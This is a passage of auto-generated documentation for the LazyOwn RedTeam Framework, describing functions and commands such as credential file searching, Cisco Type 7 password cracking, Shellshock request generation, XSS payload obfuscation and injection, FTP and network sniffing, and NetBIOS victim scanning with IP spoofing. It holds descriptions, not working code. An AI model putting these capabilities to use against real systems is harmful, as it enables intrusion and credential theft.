notation. The function returns a list of tuples, each containing an IP address
and a port number.

:param file_path: The path to the /proc/net file to be parsed.
:type file_path: str
:return: A list of tuples, each containing an IP address and a port number.
:rtype: list of tuple

## get_open_ports
Internal function to get open TCP and UDP ports on the operating system.

This function uses the `parse_proc_net_file` function to extract open TCP and UDP
ports from the corresponding /proc/net files. It returns two lists: one for TCP
ports and one for UDP ports.

:return: A tuple containing two lists: the first list with open TCP ports and
        the second list with open UDP ports.
:rtype: tuple of (list of tuple, list of tuple)

## find_credentials
Searches for potential credentials in files within the specified directory.

This function uses a regular expression to find possible credentials such as
passwords, secrets, API keys, and tokens in files within the given directory.
It iterates through all files in the directory and prints any matches found.

:param directory: The directory to search for files containing credentials.
:type directory: str
:return: None

## rotate_char
Internal function to rotate characters for ROT cipher.

This function takes a character and a shift value, and rotates the character
by the specified shift amount. It only affects alphabetical characters, leaving
non-alphabetical characters unchanged.

:param c: The character to be rotated.
:type c: str
:param shift: The number of positions to shift the character.
:type shift: int
:return: The rotated character.
:rtype: str

## get_network_info
Retrieves network interface information with their associated IP addresses.

This function executes a shell command to gather network interface details, 
parses the output to extract interface names and their corresponding IP addresses, 
and returns this information in a dictionary format. The dictionary keys are
interface names, and the values are IP addresses.

:return: A dictionary where the keys are network interface names and the values
         are their associated IP addresses.
:rtype: dict

## getprompt
Generate a command prompt string with network information and user status.

:param: None

:returns: A string representing the command prompt with network information and user status.

Manual execution:
To manually get a prompt string with network information and user status, ensure you have `get_network_info()` implemented to return a dictionary of network interfaces and their IPs. Then use the function to create a prompt string based on the current user and network info.

Example:
If the function `get_network_info()` returns:
    {
        'tun0': '10.0.0.1',
        'eth0': '192.168.1.2'
    }

And the user is root, the prompt string generated might be:
    [LazyOwn👽10.0.0.1]# 
If the user is not root, it would be:
    [LazyOwn👽10.0.0.1]$ 

If no 'tun' interface is found, the function will use the first available IP or fallback to '127.0.0.1'.

## copy2clip
Copia el texto proporcionado al portapapeles usando xclip.

Args:
    text (str): El texto que se desea copiar al portapapeles.

Example:
    copy2clip("Hello, World!")

## clean_output
Elimina secuencias de escape de color y otros caracteres no imprimibles.

## teclado_usuario
Procesa un archivo para extraer y mostrar caracteres desde secuencias de escritura específicas.

Args:
    filename (str): El nombre del archivo a leer.

Raises:
    FileNotFoundError: Si el archivo no se encuentra.
    Exception: Para otros errores que puedan ocurrir.

## salida_strace
Lee un archivo, extrae texto desde secuencias de escritura y muestra el contenido reconstruido.

Args:
    filename (str): El nombre del archivo a leer.

Raises:
    FileNotFoundError: Si el archivo no se encuentra.
    Exception: Para otros errores que puedan ocurrir.

## exploitalert
Process and display results from ExploitAlert.

This function checks if the provided content contains any results. 
If results are present, it prints the title and link for each exploit found, 
and appends the results to a predata list. If no results are found, 
it prints an error message.

Parameters:
- content (list): A list of dictionaries containing exploit information.

Returns:
None
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## packetstormsecurity
Process and display results from PacketStorm Security.

This function extracts exploit data from the provided content using regex. 
If any results are found, it prints the title and link for each exploit, 
and appends the results to a predata list. If no results are found, 
it prints an error message.

Parameters:
- content (str): The HTML content from PacketStorm Security.

Returns:
None
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## nvddb
Process and display results from the National Vulnerability Database.

This function checks if there are any vulnerabilities in the provided content. 
If vulnerabilities are present, it prints the ID, description, and link 
for each CVE found, and appends the results to a predata list. 
If no results are found, it prints an error message.

Parameters:
- content (dict): A dictionary containing vulnerability data.

Returns:
None
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## find_ss
Find CVEs in the National Vulnerability Database based on a keyword.

This function takes a keyword, formats it for the API request, 
and sends a GET request to the NVD API. If the request is successful, 
it returns the JSON response containing CVE data; otherwise, 
it returns False.

Parameters:
- keyword (str): The keyword to search for in CVEs.

Returns:
- dict or bool: The JSON response containing CVE data or False on failure.
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## find_ea
Find exploits in ExploitAlert based on a keyword.

This function takes a keyword, formats it for the API request, 
and sends a GET request to the ExploitAlert API. If the request is successful, 
it returns the JSON response containing exploit data; otherwise, 
it returns False.

Parameters:
- keyword (str): The keyword to search for exploits.

Returns:
- dict or bool: The JSON response containing exploit data or False on failure.
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## find_ps
Find exploits in PacketStorm Security based on a keyword.

This function takes a keyword, formats it for the search request, 
and sends a GET request to the PacketStorm Security website. 
If the request is successful, it returns the HTML response; otherwise, 
it returns False.

Parameters:
- keyword (str): The keyword to search for exploits.

Returns:
- str or bool: The HTML response containing exploit data or False on failure.
Thanks to Sicat 🐈
An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/

## xor_encrypt_decrypt
Encrypts or decrypts data using XOR encryption with the provided key.

Parameters:
data (bytes or bytearray): The input data to be encrypted or decrypted.
key (str): The encryption key as a string.

Returns:
bytearray: The result of the XOR operation, which can be either the encrypted or decrypted data.

Example:
encrypted_data = xor_encrypt_decrypt(b"Hello, World!", "key")
decrypted_data = xor_encrypt_decrypt(encrypted_data, "key")
print(decrypted_data.decode("utf-8"))  # Outputs: Hello, World!

Additional Notes:
- XOR encryption is symmetric, meaning that the same function is used for both encryption and decryption.
- The key is repeated cyclically to match the length of the data if necessary.
- This method is commonly used for simple encryption tasks, but it is not secure for protecting sensitive information.

## run
Executes a shell command using the subprocess module, capturing its output.

Parameters:
command (str): The command to execute.

Returns:
str: The output of the command if successful, or an error message if an exception occurs.

Exceptions:
- FileNotFoundError: Raised if the command is not found.
- subprocess.CalledProcessError: Raised if the command exits with a non-zero status.
- subprocess.TimeoutExpired: Raised if the command times out.
- Exception: Catches any other unexpected exceptions.

Example:
output = run("ls -la")
print(output)

Additional Notes:
The function attempts to execute the provided command, capturing its output.
It also handles common exceptions that may occur during command execution.

## is_exist
Check if a file exists.

This function checks whether a given file exists on the filesystem. If the file 
does not exist, it prints an error message and returns False. Otherwise, it returns True.

Arguments:
file (str): The path to the file that needs to be checked.

Returns:
bool: Returns True if the file exists, False otherwise.

Example:
>>> is_exist('/path/to/file.txt')
True
>>> is_exist('/non/existent/file.txt')
False

Notes:
This function uses os.path.isfile to determine the existence of the file. 
Ensure that the provided path is correct and accessible.

## get_domain
Extracts the domain from a given URL.

Parameters:
url (str): The full URL from which to extract the domain.

Returns:
str: The extracted domain from the URL, or None if it cannot be extracted.

## generate_certificates
Generates a certificate authority (CA), client certificate, and client key.

Returns:
    str: Paths to the generated CA certificate, client certificate, and client key.

## generate_emails
Generate email permutations based on the provided full name and domain.

This function takes a full name and domain as input, splits the full name into
components, and creates a list of potential email addresses.

Parameters:
full_name (str): The full name to base the email addresses on.
domain (str): The domain to use for the generated email addresses.

Internal Variables:
names (list): A list of the name components extracted from the full name.
first_name (str): The first name component.
last_name (str): The last name component.
first_initial (str): The first initial of the first name.
last_initial (str): The first initial of the last name.

Returns:
list: A list of generated email permutations.

Note:
- At least two parts of the name are required to generate valid email addresses.

## clean_url
Verifica si el último carácter es una barra y, de ser así, la elimina

## random_string
Generates a random alphanumeric string.

## generate_http_req
Generates an HTTP request with the Shellshock payload.

## format_openssh_key
Formats a raw OpenSSH private key string to the correct OpenSSH format.

This function takes a raw OpenSSH private key string, cleans it by removing any unnecessary 
characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
of 64 characters, and then reassembles the key with the standard OpenSSH header and footer. 
It ensures the key follows the correct OpenSSH format.

Parameters:
    raw_key (str): The raw OpenSSH private key string to format.

Returns:
    str: The formatted OpenSSH private key with proper headers, footers, and 64-character lines.

## format_rsa_key
Formats a raw RSA private key string to the correct PEM format.

This function takes a raw RSA private key string, cleans it by removing any unnecessary
characters (such as newlines, spaces, and headers/footers), splits the key content into lines 
of 64 characters, and then reassembles the key with the standard PEM header and footer. 
It ensures the key follows the correct RSA format.

Parameters:
    raw_key (str): The raw RSA private key string to format.

Returns:
    str: The formatted RSA private key with proper headers, footers, and 64-character lines.

## is_package_installed
Check if a Python package is installed.

:param package_name: Name of the package to check.
:returns: True if installed, False otherwise.

## extract
Extracts and processes specific hexadecimal sequences from a string based on a flag.

If the `extract_flag` is set to True, the function extracts all sequences of the form 'x[a-f0-9][a-f0-9]' 
(where 'x' is followed by two hexadecimal digits), removes the 'x' from the extracted sequences, 
and returns the processed string. If `extract_flag` is False, the function returns the original string.

Parameters:
    string (str): The input string from which hexadecimal sequences are to be extracted.
    extract_flag (bool): A flag indicating whether to perform the extraction (True) or not (False).

Returns:
    str: The processed string with the extracted hexadecimal sequences if `extract_flag` is True, 
         or the original string if `extract_flag` is False.

## clean_html
Remove HTML tags from a string.

This function uses a regular expression to strip HTML tags and return plain text.

:param html_string: A string containing HTML content.
:returns: A cleaned string with HTML tags removed.

## command
Run a command, print output in real-time, and store the output in a variable.

This method executes a given command using `subprocess.Popen`, streams both the standard 
output and standard error to the console in real-time, and stores the full output (stdout 
and stderr) in a variable. If interrupted, the process is terminated gracefully.

:param command: The command to be executed as a string.
:type command: str

:returns: The full output of the command (stdout and stderr).
:rtype: str

Example:
    To execute a command, call `run_command("ls -l")`.

## generate_random_cve_id
Generates a random CVE (Common Vulnerabilities and Exposures) ID.

This function creates a random CVE ID by selecting a random year between 2020 and 2024,
and a random code between 1000 and 9999. The CVE ID is returned in the format 'CVE-{year}-{code}'.

Returns:
    str: A randomly generated CVE ID in the format 'CVE-{year}-{code}'.

## get_credentials
Searches for credential files with the pattern 'credentials*.txt' and allows the user to select one.

The function lists all matching files and prompts the user to select one. It then reads the selected file
and returns a list of tuples with the format (username, password) for each line in the file.

Returns:
list of tuples: A list containing tuples with (username, password) for each credential found in the file.
                If no files are found or an invalid selection is made, an empty list is returned.

## obfuscate_payload
Obfuscates a payload string by converting its characters into hexadecimal format, 
with additional comments for every third character.

For every character in the payload, the function converts it to its hexadecimal representation.
Every third character (after the first) is enclosed in a comment `/*hex_value*/`, while the rest 
are prefixed with `\x`.

Parameters:
    payload (str): The input string that needs to be obfuscated.

Returns:
    str: The obfuscated string where characters are replaced by their hexadecimal representations, 
         with every third character wrapped in a comment.

## read_payloads
Reads a file containing payloads and returns a list of properly formatted strings.

This function opens a specified file, reads each line, and checks if the line starts with a 
double quote. If it does not, it adds double quotes around the line. Each line is stripped 
of leading and trailing whitespace before being added to the list.

Parameters:
    file_path (str): The path to the file containing payloads.

Returns:
    list: A list of strings, each representing a payload from the file, formatted with 
          leading and trailing double quotes if necessary.

## inject_payloads
Sends HTTP requests to a list of URLs with injected payloads for testing XSS vulnerabilities.

This function reads payloads from a specified file and sends GET requests to the provided URLs,
injecting obfuscated payloads into the query parameters or form fields to test for cross-site 
scripting (XSS) vulnerabilities. It handles both URLs with existing query parameters and those 
without. If forms are found in the response, it submits them with the payloads as well.

Parameters:
    urls (list): A list of URLs to test for XSS vulnerabilities.
    payload_url (str): A placeholder string within the payloads that will be replaced with 
                       the actual URL for testing.
    request_timeout (int, optional): The timeout for each request in seconds. Defaults to 15.

Returns:
    None: This function does not return any value but prints the status of each request and 
          form submission to the console.

Raises:
    requests.RequestException: Raises an exception if any HTTP request fails, which is handled
                               by printing a warning message.

## prompt
Return the prompt in the function do_xss

## is_lower
Checks if a character is lowercase.

Parameters:
    char (str): The character to check.

Returns:
    bool: True if the character is lowercase, False otherwise.

## is_upper
Checks if a character is uppercase.

Parameters:
    char (str): The character to check.

Returns:
    bool: True if the character is uppercase, False otherwise.

## is_mixed
Determines if a string contains both lowercase and uppercase characters.

Parameters:
    s (str): The string to check.

Returns:
    bool: True if the string has mixed casing, False otherwise.

## add
Adds a delimiter between string parts if it's not the first part.

Parameters:
    str_part (str): The string part to add.
    delimiter (str): The delimiter to insert between parts.
    i (int): The index of the part.

Returns:
    str: The string part with delimiter if applicable.

## detect_delimiter
Detects the delimiter used in the input string (e.g., "-", "_", ".").

Parameters:
    foo_bar (str): The input string.

Returns:
    str: The detected delimiter.

## transform
Transforms a list of string parts based on the chosen casing style.

Parameters:
    parts (list): List of string parts.
    delimiter (str): Delimiter to use between parts.
    casing (str): Casing style ('l', 'u', 'c', 'p').

Returns:
    str: The transformed string.

## handle
Splits the input string into parts based on delimiters or mixed casing.

Parameters:
    input_str (str): The input string to split.

Returns:
    list: A list of string parts.

## get_users_dic
List all .txt files in the 'sessions/' directory and prompt the user to select one by number.

:returns: The path of the selected .txt file.

## get_hash
Searches for hash files with the pattern 'hash*.txt' and allows the user to select one.

The function lists all matching files and prompts the user to select one. It then reads the selected file
and returns the hash content as a single string, without any newline characters or extra formatting.

Returns:
str: The hash content from the selected file as a single string. If no files are found or an invalid
     selection is made, an empty string is returned.

## is_digit
Check if the given character is a digit.

Args:
    the_digit (str): The character to check.

Returns:
    bool: True if the character is a digit, False otherwise.

## crack_password
Crack a Cisco Type 7 password.

Args:
    crypttext (str): The encrypted password in Type 7 format.

Returns:
    str: The cracked plaintext password or an empty string if invalid.

## get_terminal_size
No description available.

## halp
Display the help panel for the LazyOwn RedTeam Framework.

This function prints usage instructions, options, and descriptions for 
running the LazyOwn framework. It provides users with an overview of 
command-line options that can be used when executing the `./run` command.

The output includes the current version of the framework and various 
options available for users, along with a brief description of each option.

Options include:
    - `--help`: Displays the help panel.
    - `-v`: Shows the version of the framework.
    - `-p <payloadN.json>`: Executes the framework with a specified payload 
      JSON file. This option is particularly useful for Red Teams.
    - `-c <command>`: Executes a specific command using LazyOwn, for 
      example, `ping`.
    - `--no-banner`: Runs the framework without displaying the banner.
    - `-s`: Runs the framework with root privileges.
    - `--old-banner`: Displays the old banner.

Example:
    To see the help panel, call the function as follows:
    
    >>> halp()

Note:
    - This function exits the program after displaying the help information,
      using `sys.exit(0)`.

## ensure_tmux_session
Ensure that a tmux session is active.

This function checks whether a specified tmux session is currently running.
If the session does not exist, it creates a new tmux session with the specified
name and executes the command to run the LazyOwn RedTeam Framework script.

The function uses the `tmux has-session` command to check for the existence
of the session. If the session is not found (i.e., the return code is not zero),
it will create a new tmux session in detached mode and run the command 
`./run --no-banner` within that session.

Args:
    session_name (str): The name of the tmux session to check or create.

Example:
    To ensure that a tmux session named 'lazyown_sessions' is active,
    call the function as follows:
    
    >>> ensure_tmux_session('lazyown_sessions')

Note:
    - Ensure that tmux is installed and properly configured on the system.
    - The command executed within the tmux session must be valid and
      accessible in the current environment.

## get_xml
Retrieves a list of XML files from the specified directory.

Args:
    directory (str): The directory to search for XML files.

Returns:
    list: A list of XML filenames found in the specified directory.

## get_domain_from_xml
Extrae el primer dominio o dirección IP de un archivo XML de un escaneo Nmap.

## shellcode_to_sylk
No description available.

## wrapper
internal wrapper of internal function to implement multiples rhost to operate. 

## send_request
No description available.

## handle_forms
No description available.

<!-- END UTILS -->

<!-- START COMMANDS -->
# COMMANDS.md Documentation  by readmeneitor.py

## __init__
Initializer for the LazyOwnShell class.

This method sets up the initial parameters and scripts for an instance of
the LazyOwnShell class. It initializes a dictionary of parameters with default
values and a list of script names that are part of the LazyOwnShell toolkit.

Attributes:
    params (dict): A dictionary of parameters with their default values.
    scripts (list): A list of script names included in the toolkit.
    output (str): An empty string to store output or results.

## default
Handles undefined commands, including aliases.

This method checks if a given command (or its alias) exists within the class
by attempting to find a corresponding method. If the command or alias is not
found, it prints an error message.

:param line: The command or alias to be handled.
:type line: str
:return: None

## one_cmd
Internal function to execute commands.

This method attempts to execute a given command using `onecmd` and captures
the output. It sets the `output` attribute based on whether the command was
executed successfully or an exception occurred.

:param command: The command to be executed.
:type command: str
:return: A message indicating the result of the command execution.
:rtype: str

## emptyline
Handle the case where the user enters an empty line.

This method is called when the user submits an empty line of input in
the command-line interface. By default, it provides feedback indicating
that no command was entered.

It is useful for providing user-friendly messages or handling empty input
cases in a custom manner.

License: This function is part of a program released under the GNU General
Public License v3.0 (GPLv3). You can redistribute it and/or modify it
under the terms of the GPLv3, as published by the Free Software Foundation.

Note: This method is called by the cmd library when an empty line is
entered. You can override it in a subclass to change its behavior.

Example:
    >>> shell = LazyOwnShell()
    >>> shell.emptyline()
    You didn't enter any command.

## EOF
Handle the end-of-file (EOF) condition.

This method is called when the user sends an end-of-file (EOF) signal
by pressing Ctrl+D. It is typically used to handle cleanup or exit
operations when the user terminates input.

In this implementation, it prints a farewell message and returns True
to indicate that the shell should exit.

License: This function is part of a program released under the GNU General
Public License v3.0 (GPLv3). You can redistribute it and/or modify it
under the terms of the GPLv3, as published by the Free Software Foundation.

Note: This method is a part of the `cmd` library's command handling
system. You can override it in a subclass to customize its behavior.

Example:
    >>> shell = LazyOwnShell()
    >>> shell.do_EOF(None)
    LazyOwn say Goodbye!
    (shell exits)

## postloop
Handle operations to perform after exiting the command loop.

This method is called after the command loop terminates, typically used
for performing any final cleanup or displaying messages before the program
exits.

In this implementation, it prints a message indicating that the custom
shell is exiting.

License: This function is part of a program released under the GNU General
Public License v3.0 (GPLv3). You can redistribute it and/or modify it
under the terms of the GPLv3, as published by the Free Software Foundation.

Note: This method is called automatically by the `cmd` library's command
loop after the loop terminates. You can override it in a subclass to
customize its behavior.

Example:
    >>> shell = LazyOwnShell()
    >>> shell.cmdloop()  # Exits the command loop
    Exiting custom LazyOwnShell.

## set
Set a parameter value.

This function takes a line of input, splits it into a parameter and a value,
and sets the specified parameter to the given value if the parameter exists.

:param line: A string containing the parameter and value to be set.
            Expected format: '<parameter> <value>'.
:type line: str
:return: None
:raises: ValueError if the input line does not contain exactly two elements.

## show
Show the current parameter values.

This function iterates through the current parameters and their values,
printing each parameter and its associated value.

:param line: This parameter is not used in the function.
:type line: str
:return: None

## list
Lists all available scripts in the modules directory.

This method prints a list of available scripts in a formatted manner, arranging
them into columns. It shows each script with sufficient spacing for readability.

:param line: This parameter is not used in the method.
:type line: str
:return: None

## run
Runs a specific LazyOwn script.

This method executes a script from the LazyOwn toolkit based on the provided
script name. If the script is not recognized, it prints an error message.
To see available scripts, use the `list` or `help list` commands.

:param line: The command line input containing the script name.
:type line: str
:return: None

## lazysearch
Runs the internal module `modules/lazysearch.py`.

This method executes the `lazysearch` script from the specified path, using
the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
is not set, it prints an error message.

:return: None

## lazysearch_gui
Run the internal module located at `modules/LazyOwnExplorer.py`.

This method executes the `LazyOwnExplorer.py` script, which is used for graphical user interface (GUI) functionality within the LazyOwn framework.

The function performs the following steps:

1. Calls `self.run_script` with `LazyOwnExplorer.py` to execute the GUI module.

:returns: None

Manual execution:
1. Ensure that the `modules/LazyOwnExplorer.py` script is present in the `modules` directory.
2. Run the script with:
    `python3 modules/LazyOwnExplorer.py`

Example:
    To run `LazyOwnExplorer.py` directly, execute:
    `python3 modules/LazyOwnExplorer.py`

Note:
    - Ensure that the script has the appropriate permissions and dependencies to run.
    - Verify that your environment supports GUI operations if using this script in a non-graphical environment.

## lazyown
Run the internal module located at `modules/lazyown.py`.

This method executes the `lazyown.py` script, which is a core component of the LazyOwn framework.

The function performs the following steps:

1. Calls `self.run_script` with `lazyown.py` to execute the script.

:returns: None

Manual execution:
1. Ensure that the `modules/lazyown.py` script is present in the `modules` directory.
2. Run the script with:
    `python3 modules/lazyown.py`

Example:
    To run `lazyown.py` directly, execute:
    `python3 modules/lazyown.py`

Note:
    - Ensure that the script has the appropriate permissions and dependencies to run.

## update_db
Run the internal module located at `modules/update_db.sh`.

This method executes the `update_db.sh` script to update the database of binary exploitables from `gtofbins`.

The function performs the following steps:

1. Executes the `update_db.sh` script located in the `modules` directory using `os.system`.

:returns: None

Manual execution:
1. Ensure that the `modules/update_db.sh` script is present in the `modules` directory.
2. Run the script with:
    `./modules/update_db.sh`

Example:
    To manually update the database, execute:
    `./modules/update_db.sh`

Note:
    - Ensure that the script has execute permissions.
    - The script should be run with the necessary privileges if required.

## lazynmap
Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

This method executes the `lazynmap` script, using the current working directory
and the `rhost` parameter from the `self.params` dictionary as the target IP.
If `rhost` is not set, it prints an error message.

:return: None

## lazywerkzeugdebug
Run the internal module located at `modules/lazywerkzeug.py` in debug mode.

This method executes the `lazywerkzeug.py` script with the specified parameters for remote and local hosts and ports. It is used to test Werkzeug in debug mode.

The function performs the following steps:

1. Retrieves the `rhost`, `lhost`, `rport`, and `lport` values from `self.params`.
2. Checks if all required parameters are set. If not, prints an error message and returns.
3. Calls `self.run_script` with `lazywerkzeug.py` and the specified parameters.

:param rhost: The remote host address.
:type rhost: str

:param lhost: The local host address.
:type lhost: str

:param rport: The remote port number.
:type rport: int

:param lport: The local port number.
:type lport: int

:returns: None

Manual execution:
1. Ensure that `rhost`, `lhost`, `rport`, and `lport` are set in `self.params`.
2. The script `modules/lazywerkzeug.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazywerkzeug.py <rhost> <rport> <lhost> <lport>`

Example:
    To run `lazywerkzeug.py` with `rhost` set to `"127.0.0.1"`, `rport` to `5000`, `lhost` to `"localhost"`, and `lport` to `8000`, set:
    `self.params["rhost"] = "127.0.0.1"`
    `self.params["rport"] = 5000`
    `self.params["lhost"] = "localhost"`
    `self.params["lport"] = 8000`
    Then call:
    `run_lazywerkzeugdebug()`

Note:
    - Ensure that `modules/lazywerkzeug.py` has the appropriate permissions and dependencies to run.
    - Verify that the specified hosts and ports are correct and available.

## lazygath
Run the internal module located at `modules/lazygat.sh`. to gathering the sistem :)

This method executes the `lazygat.sh` script located in the `modules` directory with `sudo` privileges.

The function performs the following steps:

1. Retrieves the current working directory.
2. Executes the `lazygat.sh` script using `sudo` to ensure it runs with elevated permissions.

:returns: None

Manual execution:
1. Ensure that the `modules/lazygat.sh` script is present in the `modules` directory.
2. Run the script with:
    `sudo ./modules/lazygat.sh`

Example:
    To manually run the script with elevated privileges, execute:
    `sudo ./modules/lazygat.sh`

Note:
    - Ensure that the script has execute permissions.
    - The script should be run with `sudo` if it requires elevated privileges.

## lazynmapdiscovery
Runs the internal module `modules/lazynmap.sh` with discovery mode.

This method executes the `lazynmap` script in discovery mode. It uses the current
working directory for locating the script.

:return: None

## lazysniff
Run the sniffer internal module located at `modules/lazysniff.py` with the specified parameters.

This method executes the script with the following arguments:

- `device`: The network interface to be used for sniffing, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `device` value from `self.params`.
2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
3. Uses `subprocess.run` to execute the `lazysniff.py` script with the `-i` option to specify the network interface.

:param device: The network interface to be used for sniffing.
:type device: str

:returns: None

Manual execution:
1. Ensure that `device` is set in `self.params`.
2. The script `modules/lazysniff.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazysniff.py -i <device>`

Example:
    To run `lazysniff` with `device` set to `"eth0"`, set:
    `self.params["device"] = "eth0"`
    Then call:
    `run_lazysniff()`

Note:
    - Ensure that `modules/lazysniff.py` has the appropriate permissions and dependencies to run.
    - Ensure that the network interface specified is valid and properly configured.

## lazyftpsniff
Run the sniffer ftp internal module located at `modules/lazyftpsniff.py` with the specified parameters.

This function executes the script with the following arguments:

- `device`: The network interface to be used for sniffing, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `device` value from `self.params`.
2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
3. Uses `subprocess.run` to execute the `lazyftpsniff.py` script with the `-i` option to specify the network interface.

:param device: The network interface to be used for sniffing.
:type device: str

:returns: None

Manual execution:
1. Ensure that `device` is set in `self.params`.
2. The script `modules/lazyftpsniff.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazyftpsniff.py -i <device>`

Example:
    To run `lazyftpsniff` with `device` set to `"eth0"`, set:
    `self.params["device"] = "eth0"`
    Then call:
    `run_lazyftpsniff()`

Note:
    - Ensure that `modules/lazyftpsniff.py` has the appropriate permissions and dependencies to run.
    - Ensure that the network interface specified is valid and properly configured.

## lazynetbios
Run the internal module to search netbios vuln victims, located at `modules/lazynetbios.py` with the specified parameters.

This function executes the script with the following arguments:

- `startip`: The starting IP address for the NetBIOS scan, specified in `self.params`.
- `endip`: The ending IP address for the NetBIOS scan, specified in `self.params`.
- `spoof_ip`: The IP address to be used for spoofing, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `startip`, `endip`, and `spoof_ip` values from `self.params`.
2. Uses `subprocess.run` to execute the `lazynetbios.py` script with the specified parameters.

:param startip: The starting IP address for the NetBIOS scan.
:type startip: str

:param endip: The ending IP address for the NetBIOS scan.
:type endip: str

:param spoof_ip: The IP address to be used for spoofing.
:type spoof_ip: str

:returns: None

Manual execution:
1. Ensure that `startip`, `endip`, and `spoof_ip` are set in `self.params`.
2. The script `modules/lazynetbios.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazynetbios.py <startip> <endip> <spoof_ip>`

Example:
    To run `lazynetbios` with `startip` set to `"192.168.1.1"`, `endip` set to `"192.168.1.10"`, and `spoof_ip` set to `"192.168.1.100"`, set:
    `self.params["startip"] = "192.168.1.1"`
    `self.params["endip"] = "192.168.1.10"`
    `self.params["spoof_ip"] = "192.168.1.100"`
    Then call:
    `run_lazynetbios()`

Note:
    - Ensure that `modules/lazynetbios.py` has the appropriate permissions and dependencies to run.
    - Ensure that the IP addresses are correctly set and valid for the NetBIOS scan.

## lazyhoneypot
Run the internal module located at `modules/lazyhoneypot.py` with the specified parameters.

This function executes the script with the following arguments:

- `email_from`: The email address from which messages will be sent, specified in `self.params`.
- `email_to`: The recipient email address, specified in `self.params`.
- `email_username`: The username for email authentication, specified in `self.params`.
- `email_password`: The password for email authentication, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `email_from`, `email_to`, `email_username`, and `email_password` values from `self.params`.
2. Calls the `run_script` method to execute the `lazyhoneypot.py` script with the provided email parameters.

:param email_from: The email address from which messages will be sent.
:type email_from: str

:param email_to: The recipient email address.
:type email_to: str

:param email_username: The username for email authentication.
:type email_username: str

:param email_password: The password for email authentication.
:type email_password: str

:returns: None

Manual execution:
1. Ensure that `email_from`, `email_to`, `email_username`, and `email_password` are set in `self.params`.
2. The script `modules/lazyhoneypot.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazyhoneypot.py --email_from <email_from> --email_to <email_to> --email_username <email_username> --email_password <email_password>`

Example:
    To run `lazyhoneypot` with `email_from` set to `"sender@example.com"`, `email_to` set to `"recipient@example.com"`, `email_username` set to `"user"`, and `email_password` set to `"pass"`, set:
    `self.params["email_from"] = "sender@example.com"`
    `self.params["email_to"] = "recipient@example.com"`
    `self.params["email_username"] = "user"`
    `self.params["email_password"] = "pass"`
    Then call:
    `run_lazyhoneypot()`

Note:
    - Ensure that `modules/lazyhoneypot.py` has the appropriate permissions and dependencies to run.
    - Ensure that the email credentials are correctly set for successful authentication and operation.

## lazygptcli
Run the internal module to create Oneliners with Groq AI located at `modules/lazygptcli.py` with the specified parameters.

This function executes the script with the following arguments:

- `prompt`: The prompt to be used by the script, specified in `self.params`.
- `api_key`: The API key to be set in the environment variable `GROQ_API_KEY`, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `prompt` and `api_key` values from `self.params`.
2. Checks if both `prompt` and `api_key` are set. If either is missing, it prints an error message and returns.
3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
4. Calls the `run_script` method to execute the `lazygptcli.py` script with the `--prompt` argument.

:param prompt: The prompt to be used by the script.
:type prompt: str

:param api_key: The API key for accessing the service.
:type api_key: str

:returns: None

Manual execution:
1. Ensure that `prompt` and `api_key` are set in `self.params`.
2. The script `modules/lazygptcli.py` should be present in the `modules` directory.
3. Set the environment variable `GROQ_API_KEY` with the API key value.
4. Run the script with:
    `python3 modules/lazygptcli.py --prompt <prompt>`

Example:
    To run `lazygptcli` with `prompt` set to `"Your prompt"` and `api_key` set to `"your_api_key"`, set:
    `self.params["prompt"] = "Your prompt"`
    `self.params["api_key"] = "your_api_key"`
    Then call:
    `run_lazygptcli()`

Note:
    - Ensure that `modules/lazygptcli.py` has the appropriate permissions and dependencies to run.
    - The environment variable `GROQ_API_KEY` must be correctly set for the script to function.

## lazysearch_bot
Run the internal module GROQ AI located at `modules/lazysearch_bot.py` with the specified parameters.

This function executes the script with the following arguments:

- `prompt`: The prompt to be used by the script, specified in `self.params`.
- `api_key`: The API key to be set in the environment variable `GROQ_API_KEY`, specified in `self.params`.

The function performs the following steps:

1. Retrieves the `prompt` and `api_key` values from `self.params`.
2. Checks if both `prompt` and `api_key` are set. If either is missing, it prints an error message and returns.
3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
4. Calls the `run_script` method to execute the `lazysearch_bot.py` script with the `--prompt` argument.

:param prompt: The prompt to be used by the script.
:type prompt: str

:param api_key: The API key for accessing the service.
:type api_key: str

:returns: None

Manual execution:
1. Ensure that `prompt` and `api_key` are set in `self.params`.
2. The script `modules/lazysearch_bot.py` should be present in the `modules` directory.
3. Set the environment variable `GROQ_API_KEY` with the API key value.
4. Run the script with:
    `python3 modules/lazysearch_bot.py --prompt <prompt>`

Example:
    To run `lazysearch_bot` with `prompt` set to `"Search query"` and `api_key` set to `"your_api_key"`, set:
    `self.params["prompt"] = "Search query"`
    `self.params["api_key"] = "your_api_key"`
    Then call:
